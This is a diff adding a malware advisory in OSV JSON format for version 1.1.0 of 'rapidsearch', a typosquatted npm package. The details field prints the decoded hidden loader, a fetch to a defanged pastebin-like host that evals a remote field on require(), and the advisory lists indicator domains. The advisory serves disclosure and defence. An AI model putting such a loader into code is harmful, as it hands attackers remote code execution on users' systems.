@@ -1,0 +1,66 @@
+{
+  "schema_version": "1.6.0",
+  "id": "LWA-2026-4842",
+  "aliases": [
+    "MAL-2026-6388"
+  ],
+  "modified": "2026-06-12T19:39:51Z",
+  "published": "2026-06-12T19:38:17Z",
+  "summary": "Malicious code in rapidsearch (npm)",
+  "details": "Package impersonates the legitimate rapidsearch library by mscdex but is published by a different email who also published the known typosquat multer-express. The main module lib/sbmh.js ships a base64-encoded string that decodes to `fetch('hxxps://jsonkeeper[.]com/b/9NXQ0').then(r=\u003er.json()).then(d=\u003e{eval(d.ret);});`. This code runs at module load time (require()), fetches a JSON payload from jsonkeeper[.]com, and evals the '.ret' field — a remote code execution vector delivering an attacker-controlled second-stage payload from an external pastebin-like host.",
+  "affected": [
+    {
+      "package": {
+        "ecosystem": "npm",
+        "name": "rapidsearch",
+        "purl": "pkg:npm/rapidsearch@1.1.0"
+      },
+      "versions": [
+        "1.1.0"
+      ],
+      "database_specific": {
+        "cwes": [
+          {
+            "cweId": "CWE-506",
+            "name": "Embedded Malicious Code"
+          }
+        ],
+        "leitwacht": {}
+      }
+    }
+  ],
+  "references": [
+    {
+      "type": "PACKAGE",
+      "url": "https://www.npmjs.com/package/rapidsearch/v/1.1.0"
+    },
+    {
+      "type": "REPORT",
+      "url": "https://threatintel.leitwacht.eu/d/LWA-2026-4842"
+    }
+  ],
+  "credits": [
+    {
+      "name": "Leitwacht",
+      "type": "FINDER",
+      "contact": [
+        "https://threatintel.leitwacht.eu"
+      ]
+    }
+  ],
+  "database_specific": {
+    "leitwacht": {
+      "category": "malware",
+      "first_seen_at": "2026-06-12T19:38:17Z",
+      "indicators_observed": {
+        "domain_observed": [
+          "jsonkeeper[.]com",
+          "mscdex[.]net"
+        ],
+        "url_observed": [
+          "hxxps://jsonkeeper[.]com/b/9NXQ0"
+        ]
+      }
+    }
+  }
+}
